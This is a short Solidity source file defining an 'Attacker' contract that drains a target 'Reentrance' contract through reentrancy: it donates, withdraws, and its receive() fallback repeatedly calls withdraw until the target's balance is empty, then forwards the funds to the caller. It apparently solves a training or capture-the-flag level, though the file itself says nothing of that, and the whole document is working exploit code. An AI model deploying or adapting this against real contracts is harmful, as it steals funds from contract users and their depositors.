// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Reentrancy.sol";

contract Attacker {
    Reentrance public reentrancy;

    constructor(address _contract) {
        reentrancy = Reentrance(payable(_contract));
    }

    function attack() public payable {
        reentrancy.donate{value: msg.value}(address(this));
        reentrancy.withdraw(msg.value);
    }

    function withdrawAll() public {
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        if(address(reentrancy).balance > 0) {
            reentrancy.withdraw(msg.value);
        }
    }
}